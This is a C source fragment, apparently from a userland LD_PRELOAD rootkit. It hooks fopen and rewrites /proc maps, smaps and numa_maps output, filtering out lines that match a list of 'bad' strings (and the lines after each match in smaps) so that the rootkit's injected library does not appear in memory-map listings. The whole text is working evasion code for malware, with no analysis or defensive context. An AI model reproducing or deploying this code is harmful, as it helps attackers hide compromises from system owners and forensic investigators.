char *badstring(char *buf){
    char *ret = NULL;
    for(int i=0; i != sizeofarr(bads); i++){
        ret = strstr(buf, bads[i]);
        if(ret) break;
    }
    return ret;
}

FILE *forge_maps(const char *pathname){
    FILE *o = tmpfile(), *pnt;
    char buf[LINE_MAX];

    hook(CFOPEN);
    if((pnt = call(CFOPEN, pathname, "r")) == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
        if(!badstring(buf))
            fputs(buf, o);

    fclose(pnt);
    fseek(o, 0, SEEK_SET);
    return o;
}

FILE *forge_smaps(const char *pathname){
    FILE *o = tmpfile(), *pnt;
    char buf[LINE_MAX];
    int i = 0;

    hook(CFOPEN);
    if((pnt = call(CFOPEN, pathname, "r")) == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL){
        if(i > 0) i++;
        if(i > 15) i = 0;
        if(badstring(buf)) i = 1;
        if(i == 0) fputs(buf, o);
    }

    fclose(pnt);
    fseek(o, 0, SEEK_SET);
    return o;
}

FILE *forge_numamaps(const char *pathname){
    FILE *o = tmpfile(), *pnt;
    char buf[LINE_MAX];

    hook(CFOPEN);
    if((pnt = call(CFOPEN, pathname, "r")) == NULL){
        errno = ENOENT;
        return NULL;
    }

    while(fgets(buf, sizeof(buf), pnt) != NULL)
        if(!badstring(buf))
            fputs(buf, o);

    fclose(pnt);
    fseek(o, 0, SEEK_SET);
    return o;
}
